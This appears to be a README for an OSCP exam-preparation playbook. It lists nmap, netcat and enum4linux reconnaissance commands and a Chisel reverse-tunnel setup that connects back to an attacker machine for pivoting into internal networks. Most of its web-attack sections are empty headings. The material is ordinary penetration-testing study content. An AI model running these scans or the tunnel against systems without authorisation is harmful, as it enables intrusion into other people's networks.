![alt text](https://github.com/GunzyPunzy/Gunnajs-Playbook-OSCP/blob/main/anfader-oscp.jpg)

# Reconnaissance

<details>
  <summary><strong>Nmap</strong></summary>

### Basic Scan
```bash
nmap -n -sT -A -Pn <target>
````

### Full Scan

```bash
nmap -n -sT -p- -T4 -Pn <target>
```

### UDP Scan

```bash
nmap -n -sU --top-ports 1000 <target>
```

</details>

<details>
  <summary><strong>Banner Grabbing</strong></summary>

```bash
nc <target> <port>
```

```bash
nmap --script banner -p <port> <target>
```

</details>

<details>
  <summary><strong>enum4linux</strong></summary>

```bash
enum4linux -a <target>
```

</details>

# Enumeration

<details> <summary><strong>FTP</strong></summary>

</details>

<details> <summary><strong>SSH</strong></summary>

</details>

<details> <summary><strong>SMTP</strong></summary>

</details>

<details> <summary><strong>NFS</strong></summary>

</details>

<details> <summary><strong>Databases</strong></summary>

</details>

<details> <summary><strong>SNMP</strong></summary>

</details>

# WebApp

<details>
  <summary><strong>Content Discovery</strong></summary>

</details>

<details>
  <summary><strong>File Upload</strong></summary>

</details>

<details>
  <summary><strong>Local / Remote File Inclusion (LFI / RFI)</strong></summary>

</details>

<details>
  <summary><strong>Directory Traversal</strong></summary>

</details>

<details>
  <summary><strong>SQL Injection</strong></summary>

</details>

<details> <summary><strong>WordPress</strong></summary>

</details>

<details> <summary><strong>Joomla</strong></summary>

</details>

<details> <summary><strong>Drupala</strong></summary>

</details>

# Pivoting

<details>
  <summary> Chisel </summary> 

  ### Creating a server
  ```shell
  chisel server --port <PORT> --reverse
  ```

  ### Edit /etc/proxychains4.conf
  ```shell
  [ProxyList]
  socks5 127.0.0.1 1080
  ```

  ### Connecting from the client

   ```shell
  .\chisel client <ATTACK_MACHINE_IP>:<PORT> R:socks
  ```

  ### Sending command via the tunnel
  ```shell
  proxychains -q <command>
  ```

</details> 

# File Transfers

# Windows 

# Linux
